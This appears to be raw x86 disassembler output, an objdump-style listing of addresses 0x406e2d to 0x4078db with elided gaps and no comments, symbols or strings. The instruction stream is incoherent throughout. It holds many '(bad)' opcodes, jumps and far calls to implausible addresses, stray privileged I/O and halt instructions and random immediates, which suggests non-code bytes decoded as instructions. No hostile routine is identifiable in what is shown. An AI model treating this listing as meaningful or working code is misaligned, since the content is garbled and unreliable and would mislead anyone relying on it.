  406e2d:	repz ror ch,0x8
  406e31:	jmp    0xcd2bc584
  406e36:	test   al,0x5f
  406e38:	push   DWORD PTR [ebp+eax*1+0x38]
  406e3c:	ins    BYTE PTR es:[edi],dx
  406e3d:	out    0xa4,al
  406e3f:	dec    edi
  406e40:	and    ecx,0xffffffa4
  406e43:	lds    eax,FWORD PTR [edx]
  406e45:	ret    0xe239
  406e48:	inc    esp
  406e49:	aad    0x43
  406e4b:	imul   ecx,DWORD PTR [ebp+0x53aa922c],0xffffffd1
  406e52:	ret    0x20
  406e55:	jmp    0x353fc11a
  406e5a:	ret    0xe8ac
  406e5d:	jge    0x406e56
  406e5f:	pop    edx
  406e60:	add    dl,bl
  406e62:	and    bl,0xc2
  406e65:	xor    ch,bl
  406e67:	sbb    al,0xc
  406e69:	jmp    0x12c527c
	...
  406e96:	add    BYTE PTR [eax],al
  406e98:	xor    al,0xac
  406e9a:	cmp    DWORD PTR [ebp+0x77],0x5b
  406e9e:	jne    0x406eab
  406ea0:	dec    edi
  406ea1:	push   edi
  406ea2:	add    BYTE PTR [eax],al
  406ea4:	xchg   edi,eax
  406ea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ea6:	pop    ebx
  406ea7:	leave  
  406ea8:	and    eax,0x928aff48
  406ead:	inc    edi
  406eae:	mov    edx,0x5b5700
  406eb3:	push   0x57
  406eb5:	add    al,0x75
  406eb7:	adc    BYTE PTR [eax-0x10f78afc],bh
  406ebd:	jp     0x406e8d
  406ebf:	add    BYTE PTR [edi-0x26],dl
  406ec2:	mov    edi,0xf8586b7e
  406ec7:	sub    edx,ebp
  406ec9:	push   0xffffff83
  406ecb:	jge    0x406f04
  406ecd:	pop    ebx
  406ece:	jne    0x406ed7
  406ed0:	mov    WORD PTR [edi+0x0],ss
  406ed3:	add    BYTE PTR [edi],dl
  406ed5:	out    dx,al
  406ed6:	add    ebx,ebp
  406ed8:	pop    ebp
  406ed9:	int    0xc3
  406edb:	pop    edi
  406edc:	fmul   QWORD PTR [edi]
  406ede:	ret    0x170c
  406ee1:	lods   al,BYTE PTR ds:[esi]
  406ee2:	mov    ebp,esp
  406ee4:	xchg   esi,eax
  406ee5:	push   cs
  406ee6:	hlt    
  406ee7:	(bad)  
  406ee8:	loopne 0x406eee
  406eea:	push   DWORD PTR [ebp-0x1d]
  406eed:	rol    DWORD PTR [ebp-0xfaee0c],cl
  406ef3:	(bad)  
  406ef4:	pop    edx
  406ef5:	(bad)  
  406ef6:	std    
  406ef7:	inc    DWORD PTR [eax]
  406ef9:	pop    eax
	...
  406f26:	out    0x1b,eax
  406f28:	test   esp,edi
  406f2a:	xchg   ecx,eax
  406f2b:	add    al,0xff
  406f2d:	add    edi,edx
  406f2f:	pop    edx
  406f30:	add    BYTE PTR [ebp-0xa8d6],cl
  406f36:	rol    BYTE PTR [esi*2+0x4b53e08],1
  406f3d:	lea    edi,[ebx-0x66005618]
  406f43:	je     0x406f63
  406f45:	add    BYTE PTR [esp+eax*2],ah
  406f48:	jbe    0x406ecf
  406f4a:	mov    al,dh
  406f4c:	test   eax,0x459eeff
  406f51:	call   0x44f595
  406f56:	mov    ebp,0x4274a9bc
  406f5b:	cmp    ebx,eax
  406f5d:	jne    0x406f99
  406f5f:	jno    0x406f25
  406f61:	jmp    0x406fa6
  406f63:	fadd   QWORD PTR [edx]
  406f65:	add    BYTE PTR [esi],bh
  406f67:	inc    esp
  406f68:	mov    edx,0x4e4436c2
  406f6d:	mov    edx,DWORD PTR [edx-0x3f]
  406f70:	sar    ah,0x8d
  406f73:	sub    esp,ecx
  406f75:	push   0xffffff94
  406f77:	ins    DWORD PTR es:[edi],dx
  406f78:	das    
  406f79:	or     BYTE PTR [esi],dl
  406f7b:	mov    bh,0xa9
  406f7d:	jmp    DWORD PTR [ecx]
  406f7f:	cmp    ebx,eax
  406f81:	je     0x406ff5
  406f83:	jmp    0x7f9b:0x4c8bff4c
	...
  406fb2:	add    BYTE PTR [eax],al
  406fb4:	or     DWORD PTR [ebp-0x58],eax
  406fb7:	or     edi,esi
  406fb9:	mov    BYTE PTR ds:0x4aa82eb,0x6a
  406fc0:	aas    
  406fc1:	mov    edi,0x258eff3e
  406fc6:	cs or  dh,dl
  406fc9:	jmp    0xbf7e7083
  406fce:	ret    
  406fcf:	jle    0x406fdf
  406fd1:	leave  
  406fd2:	ds adc al,0x6
  406fd5:	jg     0x406f80
  406fd7:	jne    0x407015
  406fd9:	rol    DWORD PTR [edx],1
  406fdb:	mov    edx,DWORD PTR [ebx]
  406fdd:	pop    ebx
  406fde:	cmc    
  406fdf:	jl     0x40702d
  406fe1:	shr    ecx,0x1d
  406fe4:	aas    
  406fe5:	loopne 0x407012
  406fe7:	test   eax,0xf8144e0e
  406fec:	cwde   
  406fed:	test   al,0xd9
  406fef:	test   al,0xb
  406ff1:	pop    edi
  406ff2:	xchg   ecx,eax
  406ff3:	pop    esp
  406ff4:	dec    bp
  406ff6:	jbe    0x406fe4
  406ff8:	cli    
  406ff9:	push   0xfffffffb
  406ffb:	add    eax,0xcc6c5665
  407000:	jmp    0x2b24:0x5c471fe
  407007:	(bad)  
  407009:	test   al,0x62
  40700b:	xchg   edi,eax
  40700c:	mov    edi,0x51abe916
  407011:	dec    ebp
  407012:	call   0xa8:0x93c064dc
	...
  407041:	add    bl,cl
  407043:	bound  eax,QWORD PTR [ecx+0xb]
  407046:	cmp    DWORD PTR [ebp+0x26],ecx
  407049:	cld    
  40704a:	icebp  
  40704b:	mov    DWORD PTR [esi-0x63b37be3],0xe6219fb
  407055:	test   al,0x19
  407057:	popa   
  407058:	sub    DWORD PTR [esi],ebp
  40705a:	cmp    al,0x40
  40705c:	xchg   esi,eax
  40705d:	or     BYTE PTR [ebx+0x1fbe96b],0x4d
  407064:	ja     0x407066
  407066:	mov    dh,0x5b
  407068:	icebp  
  407069:	add    edi,DWORD PTR [esi]
  40706b:	inc    eax
  40706c:	jmp    0x8e04:0x436b837a
  407073:	fisub  WORD PTR [ebx+0x4]
  407076:	(bad)  
  407077:	dec    esp
  407078:	(bad)  
  407079:	push   esp
  40707a:	rol    esi,1
  40707c:	icebp  
  40707d:	fwait
  40707e:	push   cs
  40707f:	push   ds
  407080:	add    cl,ch
  407082:	cmp    eax,0x3c30bfd6
  407087:	inc    eax
  407088:	sub    al,0x1c
  40708a:	cmp    eax,0xdc6eb98
  40708f:	loopne 0x4070e5
  407091:	in     eax,0x24
  407093:	imul   ebp,DWORD PTR [edx-0x17],0xe984dded
  40709a:	in     eax,0x4c
  40709c:	call   FWORD PTR [ecx]
  40709e:	loope  0x407066
  4070a0:	or     al,0x76
  4070a2:	in     al,dx
  4070a3:	push   0x58
  4070a5:	rol    BYTE PTR [eax],0x0
	...
  4070d0:	(bad)  
  4070d1:	push   0xffffff83
  4070d3:	in     al,0x4d
  4070d5:	pop    ebx
  4070d6:	jne    0x4070c2
  4070d8:	cld    
  4070d9:	aas    
  4070da:	add    al,0x6c
  4070dc:	jne    0x4070a5
  4070de:	cdq    
  4070df:	bound  edi,QWORD PTR [ebp-0x50]
  4070e2:	leave  
  4070e3:	sub    edx,DWORD PTR [esi+0x4c]
  4070e6:	push   esp
  4070e7:	jb     0x40708f
  4070e9:	fadd   st,st(3)
  4070eb:	xor    ecx,esi
  4070ed:	xchg   edi,edi
  4070ef:	ret    
  4070f0:	cmp    eax,0x359cffa4
  4070f5:	xor    al,0xc4
  4070f7:	ss loope 0x407145
  4070fa:	(bad)  
  4070fb:	lods   al,BYTE PTR ds:[esi]
  4070fc:	fstp   DWORD PTR [edx+0x0]
  4070ff:	jmp    0xf1955141
  407104:	xchg   esp,eax
  407105:	imul   ecx,DWORD PTR [ebp+0x6aaad5a4],0xfc9686ed
  40710f:	cdq    
  407110:	mov    al,ds:0x8fe608c5
  407115:	pop    edi
  407116:	inc    edi
  407117:	push   0xe30d4f16
  40711c:	out    0x61,al
  40711e:	je     0x407103
  407120:	mov    esp,0xe700f8cd
  407125:	mov    cl,cl
  407127:	xor    edx,DWORD PTR [edi-0x6f74fb10]
  40712d:	fdivr  DWORD PTR [edi-0x3df1b7fd]
  407133:	add    al,0x0
	...
  40715d:	add    BYTE PTR [edi+0x14ec8baa],ah
  407163:	or     al,0xf4
  407165:	push   ebx
  407166:	pusha  
  407167:	outs   dx,DWORD PTR ds:[esi]
  407168:	cwde   
  407169:	cmp    ah,BYTE PTR [edi-0x271317a9]
  40716f:	hlt    
  407170:	dec    BYTE PTR [ecx+0x458d0362]
  407176:	add    ebp,DWORD PTR [eax-0xb2fd618]
  40717c:	(bad)  
  40717d:	xor    edi,esp
  40717f:	jno    0x40719f
  407181:	push   0x6d
  407183:	outs   dx,DWORD PTR ds:[esi]
  407184:	add    dl,bh
  407186:	push   edi
  407187:	push   edi
  407188:	push   DWORD PTR [ebp-0xd]
  40718b:	hlt    
  40718c:	je     0x407196
  40718e:	out    dx,eax
  40718f:	retf   
  407190:	(bad)  
  407191:	dec    DWORD PTR [eax]
  407193:	fstp   TBYTE PTR [edi+0x47d30f]
  407199:	add    BYTE PTR [edi],ah
  40719b:	add    dh,BYTE PTR [ebp-0xc]
  40719e:	dec    edi
  40719f:	adc    edi,0xff3348ff
  4071a5:	stc    
  4071a6:	pop    ss
  4071a7:	pop    edi
  4071a8:	jbe    0x4071af
  4071aa:	bound  eax,QWORD PTR ds:[ecx]
  4071ad:	add    BYTE PTR [edi],ah
  4071af:	add    dh,BYTE PTR [ebp-0xc]
  4071b2:	das    
  4071b3:	xchg   esp,eax
  4071b4:	(bad)  
  4071b5:	dec    DWORD PTR [eax]
  4071b7:	retf   
  4071b8:	shl    BYTE PTR [ebx+eiz*1+0x1],0x75
  4071bd:	hlt    
  4071be:	pinsrw mm3,ecx,0xff
	...
  4071ea:	add    BYTE PTR [eax],al
  4071ec:	or     ch,al
  4071ee:	push   ebp
  4071ef:	hlt    
  4071f0:	ds mov ebp,0x9c3e6a12
  4071f6:	lock and BYTE PTR [esi],bh
  4071f9:	xor    al,0xa4
  4071fb:	jne    0x4071c7
  4071fd:	or     DWORD PTR [edi],ebp
  4071ff:	hlt    
  407200:	shl    DWORD PTR [esi-0x8],0xc6
  407204:	add    ecx,DWORD PTR [esp+eax*1]
  407207:	add    BYTE PTR [esi],bh
  407209:	xor    al,0x1b
  40720b:	adc    edi,ecx
  40720d:	jb     0x407213
  40720f:	jmp    FWORD PTR [ebx]
  407211:	lock fwait
  407213:	into   
  407214:	test   DWORD PTR [ebx+eax*1],esi
  407217:	push   ebx
  407218:	inc    ebp
  407219:	hlt    
  40721a:	das    
  40721b:	ss mov ch,0xdc
  40721e:	sbb    edx,DWORD PTR [ebx]
  407220:	icebp  
  407221:	jb     0x407227
  407223:	call   0x447081
  407228:	cmp    eax,0xb5474dbc
  40722d:	mov    DWORD PTR [ebx-0x6c],ebp
  407230:	dec    edi
  407231:	xor    al,0x3
  407233:	mov    al,0x4b
  407235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407236:	push   esi
  407237:	mov    eax,0x323aa
  40723c:	adc    eax,0x4147be73
  407241:	xor    al,0x4c
  407243:	push   ebx
  407244:	fdivr  QWORD PTR es:[eax+0x3fcb3e00]
  40724b:	clc    
  40724c:	mov    DWORD PTR [edx+0xff3d],eax
	...
  40727a:	xor    edx,DWORD PTR [ecx]
  40727c:	dec    eax
  40727d:	push   0x41e95d
  407282:	adc    edi,eax
  407284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407285:	call   0x44ff4d
  40728a:	ins    DWORD PTR es:[edi],dx
  40728b:	cmp    eax,0xbd8274c3
  407290:	lods   al,BYTE PTR ds:[esi]
  407291:	push   0x43365b1d
  407296:	xor    esi,DWORD PTR ds:[edi-0x15a4c146]
  40729d:	stos   DWORD PTR es:[edi],eax
  40729e:	jno    0x407242
  4072a0:	(bad)  
  4072a1:	les    edx,FWORD PTR [edi+0x3e03d7ee]
  4072a7:	or     ebp,esp
  4072a9:	mov    cl,0x90
  4072ab:	add    bl,BYTE PTR [ebp+0x12]
  4072ae:	ds pop ebx
  4072b0:	add    al,bl
  4072b2:	js     0x407255
  4072b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072b5:	add    edx,DWORD PTR [ecx]
  4072b7:	scas   al,BYTE PTR es:[edi]
  4072b8:	xchg   ecx,eax
  4072b9:	pusha  
  4072ba:	nop
  4072bb:	dec    ecx
  4072bc:	xchg   esi,eax
  4072bd:	js     0x4072b2
  4072bf:	push   0xffffffe2
  4072c1:	ror    DWORD PTR [edx],1
  4072c3:	pop    edi
  4072c4:	jo     0x4072c7
  4072c6:	xchg   ebp,eax
  4072c7:	pusha  
  4072c8:	sbb    DWORD PTR [eax+esi*2+0x19a47628],ebx
  4072cf:	and    DWORD PTR [esi],esp
  4072d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072d2:	inc    ebx
  4072d3:	stos   BYTE PTR es:[edi],al
  4072d4:	ret    0xf3a4
  4072d7:	dec    esi
  4072d8:	push   ecx
  4072d9:	fild   DWORD PTR [esi+0x805649]
	...
  407307:	add    bl,bl
  407309:	inc    edx
  40730a:	jmp    0xac62ac3b
  40730f:	stos   DWORD PTR es:[edi],eax
  407310:	ds pop ebx
  407312:	mov    DWORD PTR [ebx],eax
  407314:	inc    ecx
  407315:	iret   
  407316:	xor    DWORD PTR [ebx+esi*4+0x462e2e4f],esp
  40731d:	xor    ecx,DWORD PTR [esi]
  40731f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407320:	sub    DWORD PTR [ecx+0x1e],ecx
  407323:	sub    dh,BYTE PTR cs:[ecx+edx*4]
  407327:	int    0x19
  407329:	dec    ecx
  40732a:	loop   0x4072ef
  40732c:	mov    ebx,DWORD PTR [ebp+0x12]
  40732f:	or     BYTE PTR ds:0xb50c751b,dh
  407335:	scas   al,BYTE PTR es:[edi]
  407336:	add    ch,bh
  407338:	jno    0x4073a7
  40733a:	push   DWORD PTR [ecx+ebp*8+0x49]
  40733e:	jne    0x40731d
  407340:	popf   
  407341:	lods   eax,DWORD PTR ds:[esi]
  407342:	xor    al,0x64
  407344:	cli    
  407345:	ret    
  407346:	add    eax,0x5b4392
  40734b:	jmp    0x73352210
  407350:	ror    BYTE PTR [ecx+0x75],1
  407353:	mov    ch,0x9d
  407355:	lods   eax,DWORD PTR ds:[esi]
  407356:	or     BYTE PTR [esi+0x41e84757],dh
  40735c:	jl     0x4073a6
  40735e:	push   DWORD PTR [edx-0x7f]
  407361:	test   al,0x5b
  407363:	mov    al,0x78
  407365:	push   edi
  407366:	add    BYTE PTR [ecx+ecx*8],bh
  407369:	aaa    
  40736a:	and    DWORD PTR [ebp+0x0],0x0
	...
  407395:	add    dl,ch
  407397:	scas   eax,DWORD PTR es:[edi]
  407398:	push   ebx
  407399:	ror    al,cl
  40739b:	mov    bl,0x0
  40739d:	leave  
  40739e:	cmp    eax,0x7c0ae85b
  4073a3:	dec    eax
  4073a4:	jmp    DWORD PTR [eax+0x7]
  4073a7:	inc    edi
  4073a8:	push   0xff485de9
  4073ad:	push   ecx
  4073ae:	and    al,0x29
  4073b0:	call   DWORD PTR [esi-0x35]
  4073b3:	sahf   
  4073b4:	mov    ah,0xc1
  4073b6:	cmp    eax,0x95e9007b
  4073bb:	xchg   edx,eax
  4073bc:	fidivr WORD PTR [esi]
  4073be:	popf   
  4073bf:	rol    BYTE PTR [ebp+esi*2-0x31],cl
  4073c3:	(bad)
  4073c6:	push   ds
  4073c7:	dec    eax
  4073c8:	(bad)  
  4073c9:	jmp    0x54337bde
  4073ce:	cmc    
  4073cf:	popf   
  4073d0:	rcl    ch,0x3d
  4073d3:	pop    ebx
  4073d4:	add    BYTE PTR [esi],ah
  4073d6:	xchg   DWORD PTR [edi],ebp
  4073d8:	inc    DWORD PTR [eax]
  4073da:	and    BYTE PTR [eax+eax*1-0x39],bl
  4073de:	(bad)  
  4073e0:	(bad)  
  4073e1:	pop    ds
  4073e2:	out    0x5b,eax
  4073e4:	push   DWORD PTR [ebp-0x1d]
  4073e7:	in     al,dx
  4073e8:	inc    esp
  4073e9:	shl    al,1
  4073eb:	bound  esi,QWORD PTR [edi+ecx*4+0x458d0b1a]
  4073f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073f3:	mov    ebp,DWORD PTR [eax+0x0]
  4073f6:	out    0x5b,eax
  4073f8:	sub    BYTE PTR [edx+0x0],0x0
	...
  407424:	xlat   BYTE PTR ds:[ebx]
  407425:	cld    
  407426:	je     0x407430
  407428:	out    dx,eax
  407429:	test   dl,cl
  40742b:	add    BYTE PTR [edi-0x668b3fa8],ah
  407431:	loopne 0x4074af
  407433:	rcl    BYTE PTR [edi-0x2e16fa9e],1
  407439:	pop    ebx
  40743a:	add    BYTE PTR [eax],al
  40743c:	call   0xa14024d3
  407441:	pop    ebx
  407442:	add    BYTE PTR [ebp-0xaf50a6],cl
  407448:	mov    ah,BYTE PTR [edi+0x5b670068]
  40744e:	or     BYTE PTR [ebp-0x17afe0e6],0x45
  407455:	sbb    DWORD PTR [eax],eax
  407457:	add    BYTE PTR [ebx+ebx*1+0x75],ch
  40745b:	add    eax,0xb6fe
  407460:	fadd   DWORD PTR [si-0x4c]
  407464:	sbb    DWORD PTR [eax+eax*1-0x73],ebx
  407468:	sbb    BYTE PTR [ebx],0xb9
  40746b:	cmp    al,0x27
  40746d:	pop    ebx
  40746e:	add    BYTE PTR [ebx],dh
  407470:	addr16 in eax,dx
  407472:	test   eax,0x3c1adac7
  407477:	add    BYTE PTR [edi],dl
  407479:	pop    ebx
  40747a:	push   DWORD PTR [ebp+0x3e]
  40747d:	test   al,0x92
  40747f:	inc    ebp
  407480:	and    bh,BYTE PTR [esi+0x48]
  407483:	aam    0x9
  407485:	add    eax,DWORD PTR ds:[eax]
	...
  4074b0:	add    BYTE PTR [eax],al
  4074b2:	stc    
  4074b3:	call   DWORD PTR [edx+0x33459ff]
  4074b9:	lea    edi,[ebx+0x74]
  4074bc:	xor    ebp,DWORD PTR [edx+0x3e]
  4074bf:	stos   BYTE PTR es:[edi],al
  4074c0:	add    al,0xff
  4074c2:	imul   ebp,eax,0xffffffab
  4074c5:	out    0x7,al
  4074c7:	xor    eax,0xb0fe0b03
  4074cc:	or     al,BYTE PTR [ebx+0x7503e44b]
  4074d2:	cmp    al,0x29
  4074d4:	and    al,0xff
  4074d6:	xor    edx,DWORD PTR [eax]
  4074d8:	mov    eax,ds:0xef9cea75
  4074dd:	dec    esi
  4074de:	push   DWORD PTR [ebx]
  4074e0:	mov    al,ds:0x1aece275
  4074e5:	leave  
  4074e6:	ds xor al,0x84
  4074e9:	les    ebp,FWORD PTR [esi]
  4074eb:	and    eax,0x64664558
  4074f0:	add    BYTE PTR cs:[ecx+0x68e89f4f],al
  4074f7:	retf   0xffa1
  4074fa:	inc    ebp
  4074fb:	hlt    
  4074fc:	push   ss
  4074fd:	add    dl,BYTE PTR [ebp+0x67]
  407500:	mov    eax,DWORD PTR [ebp-0x5a]
  407503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407504:	pop    ss
  407505:	mov    esp,0xcb4266
  40750a:	ds add al,0xa0
  40750d:	jne    0x407499
  40750f:	popf   
  407510:	pop    ss
  407511:	mov    eax,0xff9bef56
	...
  40753e:	add    BYTE PTR [eax],al
  407540:	cmp    DWORD PTR [ecx],edi
  407542:	ret    
  407543:	jne    0x407581
  407545:	cdq    
  407546:	hlt    
  407547:	(bad)  
  407548:	mov    bl,0x5b
  40754a:	stc    
  40754b:	mov    al,ds:0x171e57ab
  407550:	(bad)  
  407551:	xor    bl,ah
  407553:	sahf   
  407554:	adc    DWORD PTR [esi+0x62],eax
  407557:	mov    esp,0xac41d009
  40755c:	cld    
  40755d:	adc    ebp,ecx
  40755f:	add    edi,ecx
  407561:	iret   
  407562:	cmp    eax,0xee2844ac
  407567:	mov    al,ds:0xaba5cfe9
  40756c:	cmp    al,0x28
  40756e:	fisub  WORD PTR [eax-0x542a3027]
  407574:	aam    0x26
  407576:	into   
  407577:	mov    al,ds:0x412219b5
  40757c:	neg    DWORD PTR [eax]
  40757e:	in     eax,dx
  40757f:	add    edx,DWORD PTR [ebx]
  407581:	rol    ah,cl
  407583:	test   BYTE PTR [edx+0x46],bh
  407586:	bound  eax,QWORD PTR [esi+0x3a]
  407589:	push   edx
  40758a:	test   eax,0xe91e3817
  40758f:	add    edi,DWORD PTR [esi]
  407591:	pop    ebx
  407592:	jmp    0xe987715f
  407597:	add    edi,DWORD PTR [esi]
  407599:	pop    ebx
  40759a:	je     0x4075e2
  40759c:	sub    BYTE PTR [edx+0x464a167e],0xfc
  4075a3:	or     eax,DWORD PTR [eax]
	...
  4075cd:	add    BYTE PTR [esi-0x4d],ah
  4075d0:	outs   dx,DWORD PTR ds:[esi]
  4075d1:	mov    al,ds:0x9fe3d969
  4075d6:	ds iret 
  4075d8:	imul   BYTE PTR ds:0xfdc463e
  4075de:	push   ecx
  4075df:	iret   
  4075e0:	dec    ebp
  4075e1:	stos   DWORD PTR es:[edi],eax
  4075e2:	lock inc esp
  4075e4:	inc    esi
  4075e5:	mov    al,ds:0x9fb445ee
  4075ea:	es idiv edi
  4075ed:	adc    al,0xde
  4075ef:	inc    esp
  4075f0:	pop    eax
  4075f1:	and    BYTE PTR [ebx],al
  4075f3:	push   esp
  4075f4:	add    BYTE PTR [edx+esi*4-0x46da7cc9],bh
  4075fb:	mov    ebp,0x5ab1acc7
  407600:	add    BYTE PTR [edi-0x1801610a],al
  407606:	cmp    eax,0x806c04b1
  40760b:	inc    edi
  40760c:	push   eax
  40760d:	cmp    DWORD PTR [ebp+0x15e9005b],0x3de9ff44
  407617:	inc    esp
  407618:	jne    0x40760b
  40761a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40761b:	popf   
  40761c:	leave  
  40761d:	jmp    0xe602885f
  407622:	cmp    eax,0xbdd58bae
  407627:	pop    ds
  407628:	lods   al,BYTE PTR ds:[esi]
  407629:	push   ss
  40762a:	ins    DWORD PTR es:[edi],dx
  40762b:	sbb    al,0x45
  40762d:	test   DWORD PTR [edx],edi
  40762f:	pop    ebx
  407630:	add    cl,ch
	...
  40765a:	add    BYTE PTR [eax],al
  40765c:	mov    WORD PTR [ecx],fs
  40765e:	push   0xff44ade9
  407663:	xchg   ecx,eax
  407664:	xor    BYTE PTR [edi],ah
  407666:	call   DWORD PTR [esi+0x1c09ec3]
  40766c:	inc    edx
  40766d:	imul   eax,DWORD PTR [eax],0xffffffe9
  407670:	aad    0xb2
  407672:	fdivr  QWORD PTR [esi-0x27]
  407675:	rol    BYTE PTR [ecx+esi*1+0x22],cl
  407679:	pop    ebx
  40767a:	adc    cl,ch
  40767c:	cmp    eax,0xc1455c33
  407681:	inc    esp
  407682:	mov    DWORD PTR [ecx+edi*8-0xcd2832b],esp
  407689:	xchg   BYTE PTR [eax],al
  40768b:	jmp    0x100fecd
  407690:	add    al,0xb1
  407692:	mov    DWORD PTR [ebp+0x63],0x27ffff3b
  407699:	in     eax,0x74
  40769b:	ror    BYTE PTR [eax-0x3d002b6e],0x9f
  4076a2:	pop    DWORD PTR [ebp+0x37]
  4076a5:	sbb    al,0x45
  4076a7:	fsubr  DWORD PTR [eax]
  4076a9:	push   esp
  4076aa:	add    BYTE PTR [eax],al
  4076ac:	pusha  
  4076ad:	xchg   edx,eax
  4076ae:	hlt    
  4076af:	dec    DWORD PTR [eax]
  4076b1:	pop    eax
  4076b2:	add    BYTE PTR [ebp+0x68501ba2],cl
  4076b8:	out    0x57,eax
  4076ba:	add    BYTE PTR [eax+0x75ff57bd],al
	...
  4076e8:	add    BYTE PTR [eax],al
  4076ea:	out    dx,eax
  4076eb:	out    dx,eax
  4076ec:	imul   ecx,eax,0xc00b57e7
  4076f2:	jae    0x407751
  4076f4:	cmp    DWORD PTR [ebp-0x6d],0x57
  4076f8:	jne    0x4076ff
  4076fa:	out    dx,al
  4076fb:	cli    
  4076fc:	(bad)  
  4076fd:	jmp    DWORD PTR [edi-0x174fbae4]
  407703:	push   esp
  407704:	add    BYTE PTR [eax],al
  407706:	or     dl,BYTE PTR [ebx+0x62d850b0]
  40770c:	mov    esp,0x57a768
  407711:	sbb    BYTE PTR [edx],0x93
  407714:	les    edx,FWORD PTR [eax-0x41]
  407717:	xchg   edx,eax
  407718:	enter  0x9700,0x50
  40771c:	shl    BYTE PTR [ebp+0x62],0xf6
  407720:	xlat   BYTE PTR ds:[ebx]
  407721:	add    BYTE PTR [edi+0x57],ah
  407724:	mov    eax,DWORD PTR [ebp+0x2f]
  407727:	push   ds
  407728:	add    BYTE PTR [eax],al
  40772a:	jmp    0x5f:0x3bb9c47a
  407731:	add    BYTE PTR [esi],bh
  407733:	popa   
  407734:	(bad)  
  407735:	repz xchg esp,eax
  407737:	jl     0x407781
  407739:	les    eax,FWORD PTR [edx]
  40773b:	xor    al,BYTE PTR [ebx]
  40773d:	add    BYTE PTR [ecx],bh
  40773f:	or     BYTE PTR [ebx-0x71],bl
  407742:	jnp    0x4076c8
  407744:	mov    BYTE PTR [ebp+0x6],0x72
  407748:	push   cs
  407749:	add    BYTE PTR [esi],bh
  40774b:	jno    0x407795
  40774d:	hlt    
	...
  407776:	add    BYTE PTR [eax],al
  407778:	sbb    DWORD PTR [edx],esi
  40777a:	add    eax,DWORD PTR [eax]
  40777c:	ret    
  40777d:	out    dx,eax
  40777e:	(bad)  
  40777f:	push   eax
  407780:	xchg   esp,eax
  407781:	xor    al,0x29
  407783:	add    BYTE PTR [ecx],al
  407785:	rcr    BYTE PTR [edi-0x18],0xf7
  407789:	jns    0x40778e
  40778b:	add    BYTE PTR [ebp+0x74],al
  40778e:	pop    ss
  40778f:	push   es
  407790:	mov    ebp,0x6b00b7af
  407795:	das    
  407796:	stos   BYTE PTR es:[edi],al
  407797:	mov    WORD PTR [esi],?
  407799:	xor    al,0x3
  40779b:	dec    DWORD PTR [ebx+0x44]
  40779e:	pushf  
  40779f:	jne    0x40779f
  4077a1:	adc    DWORD PTR [edi],edx
  4077a3:	mov    eax,0x414d3956
  4077a8:	add    DWORD PTR ds:[edi],edx
  4077ab:	mov    esp,0xc5b2a6
  4077b0:	ds mov ch,0xc8
  4077b3:	adc    al,0x31
  4077b5:	mov    eax,ds:0x6deedc47
  4077ba:	add    al,0xff
  4077bc:	or     esi,esp
  4077be:	stos   DWORD PTR es:[edi],eax
  4077bf:	sti    
  4077c0:	xchg   cl,dl
  4077c2:	pushf  
  4077c3:	or     edi,DWORD PTR [esi+0x3f]
  4077c6:	add    ebx,ebp
  4077c8:	sbb    bl,cl
  4077ca:	inc    edi
  4077cb:	mov    ah,0x71
  4077cd:	aas    
  4077ce:	push   edi
  4077cf:	call   0xffde2a73
  4077d4:	popa   
  4077d5:	pop    ebx
  4077d6:	fcomp  QWORD PTR [edi+0x66]
  4077d9:	push   0x27
  4077db:	add    al,0x0
	...
  407805:	add    BYTE PTR [esi],bh
  407807:	stos   DWORD PTR es:[edi],eax
  407808:	push   esi
  407809:	pop    ss
  40780a:	mov    al,BYTE PTR [edx-0x2c]
  40780d:	push   edi
  40780e:	push   esi
  40780f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407810:	inc    eax
  407811:	popf   
  407812:	cmp    DWORD PTR [esi+0x29],edx
  407815:	pop    ss
  407816:	cmp    al,0x36
  407818:	clc    
  407819:	sub    BYTE PTR [ebx+0x4a17e96b],0x42
  407820:	pushf  
  407821:	repz sbb al,cl
  407824:	in     eax,dx
  407825:	pushf  
  407826:	mov    eax,DWORD PTR [edi]
  407828:	add    DWORD PTR [edi+eax*1+0x42],eax
  40782c:	push   cs
  40782d:	or     esi,edi
  40782f:	(bad)  
  407830:	jmp    0x4077da
  407832:	push   ecx
  407833:	(bad)  
  407834:	and    BYTE PTR [ecx],cl
  407836:	adc    eax,0x838ed8c7
  40783b:	out    dx,eax
  40783c:	cwde   
  40783d:	pushf  
  40783e:	imul   esp,DWORD PTR [edi-0x1a],0x16
  407842:	xchg   edx,eax
  407843:	xor    al,BYTE PTR [eax]
  407845:	cdq    
  407846:	rol    DWORD PTR [ecx+0x62],1
  407849:	mov    ebx,0xab95c7c9
  40784e:	cwde   
  40784f:	sbb    ecx,ebp
  407851:	add    edi,DWORD PTR [ecx-0x5f545639]
  407857:	and    al,0xb6
  407859:	pushf  
  40785a:	test   eax,0x98ab6dc7
  40785f:	and    al,0xa6
  407861:	pushf  
  407862:	cdq    
  407863:	(bad)  
  407864:	popa   
  407865:	stos   DWORD PTR es:[edi],eax
  407866:	jo     0x40788c
  407868:	xchg   esi,eax
  407869:	pushf  
	...
  407892:	add    BYTE PTR [eax],al
  407894:	mov    ebp,0xa033dbf
  407899:	push   ebx
  40789a:	xchg   BYTE PTR [esi],dl
  40789c:	stos   BYTE PTR es:[edi],al
  40789d:	xor    bl,BYTE PTR [ecx+0x4171b9]
  4078a3:	bound  edi,QWORD PTR [esi-0x5b]
  4078a6:	pop    edi
  4078a7:	mov    al,ds:0xbc006a7f
  4078ac:	(bad)  
  4078ad:	and    DWORD PTR cs:0x322badb5,0xffffffbe
  4078b5:	mov    edi,0x9129e90c
  4078ba:	add    esp,0x2d
  4078bd:	inc    ecx
  4078be:	jae    0x407871
  4078c0:	rcl    BYTE PTR [esi-0x39356604],0xc
  4078c7:	inc    ecx
  4078c8:	sahf   
  4078c9:	sbb    DWORD PTR [eax],eax
  4078cb:	jmp    0xd9b89490
  4078d0:	mov    dl,0xc6
  4078d2:	or     al,0x1
  4078d4:	xor    ch,BYTE PTR ds:0x96b40eff
  4078da:	clc    
  4078db:	push   es
